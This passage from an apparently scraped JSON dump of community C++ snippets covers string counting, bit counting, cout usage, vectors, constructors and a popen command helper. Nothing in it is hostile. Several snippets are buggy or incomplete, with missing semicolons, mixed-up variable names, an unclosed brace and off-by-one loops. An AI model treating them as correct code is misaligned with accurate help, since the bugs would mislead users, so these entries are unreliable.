    "description": "{ // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 \"version\": \"0.2.0\", \"configurations\": [     {         \"name\": \"(gdb) Launch\",         \"type\": \"cppdbg\",         \"request\": \"launch\",         \"program\": \"enter program name, for example ${workspaceFolder}/a.out\",         \"args\": [],         \"stopAtEntry\": false,         \"cwd\": \"${workspaceFolder}\",         \"environment\": [],         \"externalConsole\": false,         \"MIMode\": \"gdb\",         \"setupCommands\": [             {                 \"description\": \"Enable pretty-printing for gdb\",                 \"text\": \"-enable-pretty-printing\",                 \"ignoreFailures\": true             }         ]     },     {         \"name\": \"gcc build and debug active file\",         \"type\": \"cppdbg\",         \"request\": \"launch\",         \"program\": \"${fileDirname}/${fileBasenameNoExtension}\",         \"args\": [],         \"stopAtEntry\": false,         \"cwd\": \"${workspaceFolder}\",         \"environment\": [],         \"externalConsole\": false,         \"MIMode\": \"gdb\",         \"setupCommands\": [             {                 \"description\": \"Enable pretty-printing for gdb\",                 \"text\": \"-enable-pretty-printing\",                 \"ignoreFailures\": true             }         ],         \"preLaunchTask\": \"gcc build active file\",         \"miDebuggerPath\": \"/usr/bin/gdb\"     } ] \n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1624,
    "keyword": null,
    "link": null,
    "title": " count a character in a string c++",
    "description": "count(str.begin(), str.end(), 'e')\nstd::string s = \"a_b_c\"; size_t n = std::count(s.begin(), s.end(), '_'); // n=2\nstring str_V; char chr getline(cin, str_V); for(i=0; i<=str.length; i++) {  \t  if(str[i]==chr)       {         space++        } }\n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1625,
    "keyword": null,
    "link": null,
    "title": " count bit 1 c++",
    "description": "returns the number of set bits in a integer. cout<< __builtin_popcount (11); //1011 //Ouput: 3\n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1626,
    "keyword": null,
    "link": null,
    "title": " count bits c++",
    "description": "//Method 1    int count = 0;    while (n)    {         count++;         n >>= 1;     } //Method 2 \tint count = (int)log2(number)+1;\n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1627,
    "keyword": null,
    "link": null,
    "title": " count digits c++",
    "description": "template <class T> T countDigits(T number) { \treturn T(log10(number) + 1); } //If the number is very large, use string\nint iNums = 12345; int iNumsSize = 5; for (int i=iNumsSize-1; i>=0; i--) {     int y = pow(10, i);     int z = iNums/y;     int x2 = iNums / (y * 10);     printf(\"%d-\",z - x2*10 ); }\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1628,
    "keyword": null,
    "link": null,
    "title": " count function c++",
    "description": "// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ vector<int> vec = {1, 2, 1, 1}; cout << count(vec.begin(), vec.end(), 1);  // 3 is printed as 1 occurs thrice in the vector\n1 #include <iostream> 2 #include <array> 3 #include <algorithm> 4 5 using namespace std; 6 7 int main(){ 8 array<int, 5> nums = {1, 2, 3, 100, 2}; 9 //counting number of twos 10 int numOccurrences = count(nums.begin(), nums.end(), 2); 11 cout << 2 << \" appeared \" << numOccurrences << \" times\" << endl; 12 return 0; 13 } 14 15 /* 16 2 appeared 2 times 17 */\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1629,
    "keyword": null,
    "link": null,
    "title": " count method in cpp",
    "description": "// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ vector<int> vec = {1, 2, 1, 1}; cout << count(vec.begin(), vec.end(), 1);  // 3 is printed as 1 occurs thrice in the vector\n1 #include <iostream> 2 #include <array> 3 #include <algorithm> 4 5 using namespace std; 6 7 int main(){ 8 array<int, 5> nums = {1, 2, 3, 100, 2}; 9 //counting number of twos 10 int numOccurrences = count(nums.begin(), nums.end(), 2); 11 cout << 2 << \" appeared \" << numOccurrences << \" times\" << endl; 12 return 0; 13 } 14 15 /* 16 2 appeared 2 times 17 */\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1630,
    "keyword": null,
    "link": null,
    "title": " count number of char in a string c++",
    "description": "count(str.begin(), str.end(), 'e')\nstring str_V; char chr getline(cin, str_V); for(i=0; i<=str.length; i++) {  \t  if(str[i]==chr)       {         space++        } }\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1631,
    "keyword": null,
    "link": null,
    "title": " count number of set bits C++",
    "description": "//Method 1 \tint count = __builtin_popcount(number); //Method 2 \tint count = 0;     while (number) {         count += number & 1;         n >>= 1;     }\nint hammingWeight(uint32_t n) {     int count = 0;          while (n) {         n &= (n - 1);         count++;     }          return count; }\n//Method 1    int count = 0;    while (n)    {         count++;         n >>= 1;     } //Method 2 \tint count = (int)log2(number)+1;\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1632,
    "keyword": null,
    "link": null,
    "title": " count number of zeros in array in O(logN)",
    "description": "int firstZero(int arr[], int low, int high)  { \tif (high >= low)      {          // Check if mid element is first 0          int mid = low + (high - low)/2;          if (( mid == 0 || arr[mid-1] == 1) && arr[mid] == 0)              return mid;          if (arr[mid] == 1)  // If mid element is not 0              return firstZero(arr, (mid + 1), high);          else  // If mid element is 0, but not first 0              return firstZero(arr, low, (mid -1));      }      return -1;  }    // A wrapper over recursive function firstZero()  int countZeroes(int arr[], int n)  {      // Find index of first zero in given array      int first = firstZero(arr, 0, n-1);      // If 0 is not present at all, return 0      if (first == -1)          return 0;      return (n - first);  }   //Credits : GeeksForGeeks\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1633,
    "keyword": null,
    "link": null,
    "title": " count occurrences of character in string c++",
    "description": "count(str.begin(), str.end(), 'e')\nstd::string s = \"a_b_c\"; size_t n = std::count(s.begin(), s.end(), '_'); // n=2\n#include <algorithm>  std::string s = \"a_b_c\"; size_t n = std::count(s.begin(), s.end(), '_'); //n=2 \n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1634,
    "keyword": null,
    "link": null,
    "title": " count spaces in string java",
    "description": "/* let string is s*/ void countSpace(std::string s) { int len=s.size(); int c=0; for(int i=0;i<len;i++)   if(s[i]==' ') c++; cout<<\"Total Number of spae in give string is \"<<c; } /************************************************************************** If the user already know the total number of words that string have then total_number_of_space_in_string = total_number_of_words_in_string - 1; ***************************************************************************/\n",
    "reg_date": "2021-10-12T11:39:25.000Z"
  },
  {
    "id": 1635,
    "keyword": null,
    "link": null,
    "title": " count the number of possible triangles",
    "description": "#include<bits/stdc++.h> using namespace std;  int count_triangles(int arr[], int n) {   int ans = 0;   for (int i = n - 1; i >= 2; i--){     int l = 0, r = i - 1;     while(l < r){       if (arr[l] + arr[r] > arr[i]){         ans += r - l;         r--;       }       else l++;   }      return ans; }\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1636,
    "keyword": null,
    "link": null,
    "title": " count the occurrences ofanagram",
    "description": "//this solution is for when both the string have same type of character //example: aabaabaa and aaba  #include <bits/stdc++.h>  using namespace std;  int main() {     string s,ptr;     cout<<\"Enter the first string:\"<<endl;     cin>>s;     cout<<\"enter the string whose anagram you want to find:\"<<endl;     cin>>ptr;     int q=s.size();     int k=ptr.size();     map<char,int>mp;     int count=0;     for(int i=0;i<k;i++)     {         if(mp.find(ptr[i])==mp.end())         {            mp.insert(make_pair(ptr[i],1));            count++;         }         else         {             mp[ptr[i]]++;         }      }     count=mp.size();     int ans=0;     int i=0;     int j=0;     while(j<q)     {          mp[s[j]]--;         if(mp[s[j]]==0)         {             count--;         }         if(j-i+1<k)         {             j++;         }         else if(j-i+1==k)         {             if(count==0)             {                 ans++;             }             mp[s[i]]++;             if(count==0)             {                 count++;             }             i++;             j++;         }     }      cout<<ans<<endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1637,
    "keyword": null,
    "link": null,
    "title": " count was not declared in this scope c++ codeblocks",
    "description": "int a = 45 ; cout << a ; \n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1638,
    "keyword": null,
    "link": null,
    "title": " count word c++",
    "description": "int countWords(string str) {     // Input: Go Go Ganger   \t// Output: 3     stringstream s(str);      string word; // to store individual words     int count = 0;     while (s >> word)         count++;     return count; }\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1639,
    "keyword": null,
    "link": null,
    "title": " counting valleys hackerrank solution in c++",
    "description": "#include <bits/stdc++.h> using namespace std;  int main() {     int n,updown = 0,res = 0;     char c;     cin >> n;          for(int i = 0; i++ < n;){         cin >> c;         if(c == 'U')updown++;         else updown--;         if(updown == 0 && c == 'U')res++;     }     cout << res << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1640,
    "keyword": null,
    "link": null,
    "title": " cout.flush() in c++",
    "description": "  int main() {   for(int i = 0; i < 100000 ; i++) {       cout << i << '\\r';       cout.flush();   } }\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1641,
    "keyword": null,
    "link": null,
    "title": " cout",
    "description": "#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\n#include <iostream> using std::cout; int main() {    \tcout<<\"Hello world\";     return 0; }\ncout << \"Hello World!\";\n//Akbarali saqlagan C++ bo'yicha cin operatoriga ta'rif #include <iostream> using namespace std; int main (){   int a;   cout << \"Kattaroq sonni yozing: \";   cin >> a;   int b;   cout << \"Tepadaginga nisbatan kichik bo`lgan son(qiymatni) yozing: \";   cin >> b;   cout << \"Birinchi kiritgan soningizdan ikkinchi kiitgan soningiz \" << a-b << \" marta katta ekanligi ma'lum bo'ldi.\\n\";   return 0; }\n#include<iostream> using namespace std;  int main() {     std::cout << \"cout without using the std namespace\" << std::endl;     cout << \"cout while using the std namespace\" << endl; }\n#include <iostream> #include <format>  int main()  {     std::cout << std::format(\"Hello, {}!\\n\", \"world\"); }\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1642,
    "keyword": null,
    "link": null,
    "title": " cout  c++",
    "description": "#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\n#include <iostream> using std::cout; int main() {    \tcout<<\"Hello world\";     return 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n// It prints output on the screen std::cout << \"C++ Programming\" << endl;\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1643,
    "keyword": null,
    "link": null,
    "title": " cout alternative c++",
    "description": "printf() and cout both send data to the same place.\n",
    "reg_date": "2021-10-12T11:39:26.000Z"
  },
  {
    "id": 1644,
    "keyword": null,
    "link": null,
    "title": " cout char32 t c++",
    "description": "#include <iostream>  using namespace std;  int main() {   wcout << (wchar_t)0x41 << endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1645,
    "keyword": null,
    "link": null,
    "title": " cout console",
    "description": "//std::cout -> Write in the console std::cout<<\" Your text here \"<<std::endl; //std::endl -> Add a line break //This work : int a = 23; std::cout << a ; //The console will write '23'\n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1646,
    "keyword": null,
    "link": null,
    "title": " cout does not name a type",
    "description": "//Statements in C++ need to be inside of a function int main(){ \tstd::cout << \"Hello World\" << std::endl;     //Works because we are inside of a function } std::cout << \"Hello World\" << std::endl; //Doesn't work because we are not inside of a function\n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1647,
    "keyword": null,
    "link": null,
    "title": " cout in c++",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\n#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\n#include <iostream> using std::cout; int main() {    \tcout<<\"Hello world\";     return 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n// It prints output on the screen std::cout << \"C++ Programming\" << endl;\nThe cout object in C++ is an object of class ostream.\n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1648,
    "keyword": null,
    "link": null,
    "title": " cout stack in c++",
    "description": "#include <iostream> #include <stack> #include <string>  int main(int argc, const char *argv[]) {     std::stack<int> stack;     stack.push(1);      stack.push(3);      stack.push(7);      stack.push(19);       for (std::stack<int> dump = stack; !dump.empty(); dump.pop())         std::cout << dump.top() << '\\n';      std::cout << \"(\" << stack.size() << \" elements)\\n\";      return 0; } \n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1649,
    "keyword": null,
    "link": null,
    "title": " cout value c++",
    "description": "#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1650,
    "keyword": null,
    "link": null,
    "title": " cout was not declared in this scope",
    "description": "#include <iostream> using namespace std;  adding above two lines before main will help you  NOTE: note: suggested alternative: In file included from class.cpp:1:0: /usr/include/c++/7/iostream:61:18: note:   &lsquo;std::cout&rsquo;    extern ostream cout;  /// Linked to standard output                   ^~~~ \n#include<iostream> using namespace std; //use this int main(){     char t = 'f';     char *t1;     char **t2;     cout<<t;             return 0; }\n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1651,
    "keyword": null,
    "link": null,
    "title": " cout wchar t",
    "description": "Use std::wcout instead of std::cout.  wcout << txt << endl;\n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1652,
    "keyword": null,
    "link": null,
    "title": " cp algorithm articulation points",
    "description": "int n; // number of nodes vector<vector<int>> adj; // adjacency list of graph  vector<bool> visited; vector<int> tin, low; int timer;  void dfs(int v, int p = -1) {     visited[v] = true;     tin[v] = low[v] = timer++;     int children=0;     for (int to : adj[v]) {         if (to == p) continue;         if (visited[to]) {             low[v] = min(low[v], tin[to]);         } else {             dfs(to, v);             low[v] = min(low[v], low[to]);             if (low[to] >= tin[v] && p!=-1)                 IS_CUTPOINT(v);             ++children;         }     }     if(p == -1 && children > 1)         IS_CUTPOINT(v); }  void find_cutpoints() {     timer = 0;     visited.assign(n, false);     tin.assign(n, -1);     low.assign(n, -1);     for (int i = 0; i < n; ++i) {         if (!visited[i])             dfs (i);     } } \n",
    "reg_date": "2021-10-12T11:39:27.000Z"
  },
  {
    "id": 1653,
    "keyword": null,
    "link": null,
    "title": " cplusplus",
    "description": "      reverse_iterator rbegin(); const_reverse_iterator rbegin() const; \n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1654,
    "keyword": null,
    "link": null,
    "title": " cplusplus vector assign",
    "description": "// vector assign #include <iostream> #include <vector>  int main () {   std::vector<int> first;   std::vector<int> second;   std::vector<int> third;    first.assign (7,100);             // 7 ints with a value of 100    std::vector<int>::iterator it;   it=first.begin()+1;    second.assign (it,first.end()-1); // the 5 central values of first    int myints[] = {1776,7,4};   third.assign (myints,myints+3);   // assigning from array.    std::cout << \"Size of first: \" << int (first.size()) << '\\n';   std::cout << \"Size of second: \" << int (second.size()) << '\\n';   std::cout << \"Size of third: \" << int (third.size()) << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1655,
    "keyword": null,
    "link": null,
    "title": " cplusplusbtutotrail",
    "description": "int x (0);\nint x {0}; \n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1656,
    "keyword": null,
    "link": null,
    "title": " cpp #include \"\" <>",
    "description": "#include <iostream> #include \"foop.h\"  int main(int argc, char *argv[]) { int x=42; std::cout << x <<std::endl; std::cout << foo(x) << std::endl; return 0; } \n#include <iostream>  // Searches iostream in Standard C++ Header files but not in the Current file's folder #include \"myiostream.h\" // Searcher myiostream.h in the Current file's folder and also the Standard Header files\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1657,
    "keyword": null,
    "link": null,
    "title": " cpp access vector by index",
    "description": "std::vector<int> vecOfNums{ 1, 4, 5, 22, 33, 2, 11, 89, 49 }; // Access element at index 3 int & element = vecOfNums[3];\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1658,
    "keyword": null,
    "link": null,
    "title": " cpp all in one header",
    "description": "#include<bits/stdc++.h>\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1659,
    "keyword": null,
    "link": null,
    "title": " cpp array init value",
    "description": "int array[100] = {-1}; // set first elem to -1 and the rest to 0 int array[100] = {0}; // set all to 0 int array[100] = {[0 ... 99]=-1}; // set the 0 to 99 (all) elements to -1\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1660,
    "keyword": null,
    "link": null,
    "title": " cpp boilerplate",
    "description": "#include<iostream> using namespace std;  int main() { \t// Code here \treturn 0; }\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1661,
    "keyword": null,
    "link": null,
    "title": " cpp class access array member by different name",
    "description": "struct U {     int   v[2];     int&  x;     int&  y; };  U::U()     : x(v[0])     , y(v[1]) {}\n",
    "reg_date": "2021-10-12T11:39:28.000Z"
  },
  {
    "id": 1662,
    "keyword": null,
    "link": null,
    "title": " cpp class constructor",
    "description": "class MyClass {     // The class   public:           // Access specifier     MyClass() {     // Constructor       cout << \"Hello World!\";     } };\nclass MyClass {    public:       MyClass();  // This is the constructor    private:       int someInt; };  MyClass::MyClass(void) {    someInt = 1; }\nstruct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list                   // \": n(7) {}\" is the function body }; S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\nclass Book {public:    Book(const char*);    ~Book();    void display();private:    char* name;};\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1663,
    "keyword": null,
    "link": null,
    "title": " cpp code for array sorting",
    "description": "#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \nharami.exe\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1664,
    "keyword": null,
    "link": null,
    "title": " cpp compiler online",
    "description": "Best Site With auto compile : https://godbolt.org/z/nEo4j7\nIDE Shortcuts: New file : Ctrl-M Run Code : F9 Debug Code : F8 Save Project : Ctrl-S Beautify Code : Ctrl-B Settings Menu : Ctrl-Shift-S Info : Ctrl-I  Editor Shortcuts: showSettingsMenu : Ctrl-, goToNextError : Alt-E goToPreviousError : Alt-Shift-E selectall : Ctrl-A gotoline : Ctrl-L fold : Alt-L|Ctrl-F1 unfold : Alt-Shift-L|Ctrl-Shift-F1 toggleFoldWidget : F2 toggleParentFoldWidget : Alt-F2 foldOther : Alt-0 unfoldall : Alt-Shift-0 findnext : Ctrl-K findprevious : Ctrl-Shift-K selectOrFindNext : Alt-K selectOrFindPrevious : Alt-Shift-K find : Ctrl-F overwrite : Insert selecttostart : Ctrl-Shift-Home gotostart : Ctrl-Home selectup : Shift-Up golineup : Up selecttoend : Ctrl-Shift-End gotoend : Ctrl-End selectdown : Shift-Down golinedown : Down selectwordleft : Ctrl-Shift-Left gotowordleft : Ctrl-Left selecttolinestart : Alt-Shift-Left gotolinestart : Alt-Left|Home selectleft : Shift-Left gotoleft : Left selectwordright : Ctrl-Shift-Right gotowordright : Ctrl-Right selecttolineend : Alt-Shift-Right gotolineend : Alt-Right|End selectright : Shift-Right gotoright : Right selectpagedown : Shift-Pagedown gotopagedown : Pagedown selectpageup : Shift-Pageup gotopageup : Pageup scrollup : Ctrl-Up scrolldown : Ctrl-Down selectlinestart : Shift-Home selectlineend : Shift-End togglerecording : Ctrl-Alt-E replaymacro : Ctrl-Shift-E jumptomatching : Ctrl-P selecttomatching : Ctrl-Shift-P expandToMatching : Ctrl-Shift-M removeline : Ctrl-D duplicateSelection : Ctrl-Shift-D sortlines : Ctrl-Alt-S togglecomment : Ctrl-/ toggleBlockComment : Ctrl-Shift-/ modifyNumberUp : Ctrl-Shift-Up modifyNumberDown : Ctrl-Shift-Down replace : Ctrl-H undo : Ctrl-Z redo : Ctrl-Shift-Z|Ctrl-Y copylinesup : Alt-Shift-Up movelinesup : Alt-Up copylinesdown : Alt-Shift-Down movelinesdown : Alt-Down del : Delete backspace : Shift-Backspace|Backspace cut_or_delete : Shift-Delete removetolinestart : Alt-Backspace removetolineend : Alt-Delete removewordleft : Ctrl-Backspace removewordright : Ctrl-Delete outdent : Shift-Tab indent : Tab blockoutdent : Ctrl-[ blockindent : Ctrl-] transposeletters : Ctrl-T touppercase : Ctrl-U tolowercase : Ctrl-Shift-U expandtoline : Ctrl-Shift-L addCursorAbove : Ctrl-Alt-Up addCursorBelow : Ctrl-Alt-Down addCursorAboveSkipCurrent : Ctrl-Alt-Shift-Up addCursorBelowSkipCurrent : Ctrl-Alt-Shift-Down selectMoreBefore : Ctrl-Alt-Left selectMoreAfter : Ctrl-Alt-Right selectNextBefore : Ctrl-Alt-Shift-Left selectNextAfter : Ctrl-Alt-Shift-Right splitIntoLines : Ctrl-Alt-L alignCursors : Ctrl-Alt-A findAll : Ctrl-Alt-K showKeyboardShortcuts : Ctrl-Alt-H           \ntemplate < class T, class Alloc = allocator<T> > class vector; // generic template \nThree good online compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/ http://cpp.sh/\nGood cpp compilers: --------------------- repl.it/languages/cpp www.w3schools.com/cpp/trycpp.asp?filename=demo_helloworld onlinegdb.com/online_c++_compiler programiz.com/cpp-programming/online-complier cpp.sh\ncpp.sh\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1665,
    "keyword": null,
    "link": null,
    "title": " cpp convert vector to set",
    "description": "set<int> s( vec.begin(), vec.end() ); vec.assign( s.begin(), s.end() ); \n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1666,
    "keyword": null,
    "link": null,
    "title": " cpp cout more than 1 value",
    "description": "cout << \"Hello, I am \" << age << \" years old and my zipcode is \" << zipcode;\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1667,
    "keyword": null,
    "link": null,
    "title": " cpp create lambda with recursion",
    "description": "std::function<int(int,int)> sum; sum = [term,next,&sum](int a, int b)->int { if(a>b)     return 0; else     return term(a) + sum(next(a),b); };\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1668,
    "keyword": null,
    "link": null,
    "title": " cpp execute command",
    "description": "//---------------------------------- //  CREDIT: gregpaton08 on stack overflow //  https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po //---------------------------------- #include <cstdio> #include <iostream> #include <memory> #include <stdexcept> #include <string> #include <array>  std::string exec(const char* cmd) {     std::array<char, 128> buffer;     std::string result;     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, \"r\"), pclose);     if (!pipe) {         throw std::runtime_error(\"popen() failed!\");     }     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {         result += buffer.data();     }     return result; } \n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1669,
    "keyword": null,
    "link": null,
    "title": " cpp float to int",
    "description": "float a = 5.0; int b = static_cast<int>(a);\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1670,
    "keyword": null,
    "link": null,
    "title": " cpp float to string",
    "description": "#include <sstream> //..  std::ostringstream ss; ss << myFloat; std::string s(ss.str());\n",
    "reg_date": "2021-10-12T11:39:29.000Z"
  },
  {
    "id": 1671,
    "keyword": null,
    "link": null,
    "title": " cpp fread",
    "description": "size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );\n/* fread example: read an entire file */ #include <stdio.h> #include <stdlib.h>  int main () {   FILE * pFile;   long lSize;   char * buffer;   size_t result;    pFile = fopen ( \"myfile.bin\" , \"rb\" );   if (pFile==NULL) {fputs (\"File error\",stderr); exit (1);}    // obtain file size:   fseek (pFile , 0 , SEEK_END);   lSize = ftell (pFile);   rewind (pFile);    // allocate memory to contain the whole file:   buffer = (char*) malloc (sizeof(char)*lSize);   if (buffer == NULL) {fputs (\"Memory error\",stderr); exit (2);}    // copy the file into the buffer:   result = fread (buffer,1,lSize,pFile);   if (result != lSize) {fputs (\"Reading error\",stderr); exit (3);}    /* the whole file is now loaded in the memory buffer. */    // terminate   fclose (pFile);   free (buffer);   return 0; }\n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1672,
    "keyword": null,
    "link": null,
    "title": " cpp full form",
    "description": "Full form of cpp \n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1673,
    "keyword": null,
    "link": null,
    "title": " cpp function takes in vector",
    "description": "// Make sure to specify the type of the contents, as in: void func(vector<int> vect)  {     vect.push_back(30);  } \n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1674,
    "keyword": null,
    "link": null,
    "title": " cpp function that returns two arguments",
    "description": "std::tuple<int, int> multiple_outputs(int a, int b){     return {a, b}; }\n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1675,
    "keyword": null,
    "link": null,
    "title": " cpp get data type",
    "description": "#include <typeinfo> ... cout << typeid(variable).name() << endl; \n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1676,
    "keyword": null,
    "link": null,
    "title": " cpp get float from integer division",
    "description": "float ans = (float)a / (float)b;\n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1677,
    "keyword": null,
    "link": null,
    "title": " cpp get last element of vector",
    "description": "vector<int> v; cout << v[v.size() - 1]; cout << *(v.end() - 1); cout << *v.rbegin(); // all three of them work\n#include<iostream> /*To get the last element of the array we first get the size      of the array by using sizeof().  Unfortunately, this gives      us the size of the array in bytes.  To fix this, we divide     the size (in bytes) by the size of the data type in the array.     In our case, this would be int, so we divide sizeof(array)      by sizeof(int).  Since arrays  start from 0 and not 1 we      subtract one to get the last element.     -yegor*/ int array[5] = { 1, 2, 3, 4, 5 }; printf(\"Last Element of Array: %d\", array[(sizeof(array)/sizeof(int))-1]);\nvector<int> vec; vec.push_back(0); vec.push_back(1); int last_element = vec.back(); int also_last_element = vec[vec.size() - 1]; \n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1678,
    "keyword": null,
    "link": null,
    "title": " cpp get screen resolution",
    "description": "#include \"wtypes.h\" #include <iostream> using namespace std;  // Get the horizontal and vertical screen sizes in pixel void GetDesktopResolution(int& horizontal, int& vertical) {    RECT desktop;    // Get a handle to the desktop window    const HWND hDesktop = GetDesktopWindow();    // Get the size of screen to the variable desktop    GetWindowRect(hDesktop, &desktop);    // The top left corner will have coordinates (0,0)    // and the bottom right corner will have coordinates    // (horizontal, vertical)    horizontal = desktop.right;    vertical = desktop.bottom; }  int main() {           int horizontal = 0;    int vertical = 0;    GetDesktopResolution(horizontal, vertical);    cout << horizontal << '\\n' << vertical << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1679,
    "keyword": null,
    "link": null,
    "title": " cpp global variable",
    "description": "// a.cpp int x = 5;  // b.cpp extern int x; // allows b.cpp to access 'x' from a.cpp\n#include <iostream>  int global = 3; // Une variable globale  void ChangeGlobal() {    global = 5; // R&eacute;f&eacute;rence &agrave; la variable globale &agrave; l'int&eacute;rieur d'une fonction }  int main() {    std::cout << global << '\\n'; // R&eacute;f&eacute;rence &agrave; la variable globale dans une autre fonction    ChangeGlobal();    std::cout << global << '\\n';    return 0; } \nint g_x; // global variable g_x\n",
    "reg_date": "2021-10-12T11:39:30.000Z"
  },
  {
    "id": 1680,
    "keyword": null,
    "link": null,
    "title": " cpp goiver all the map values",
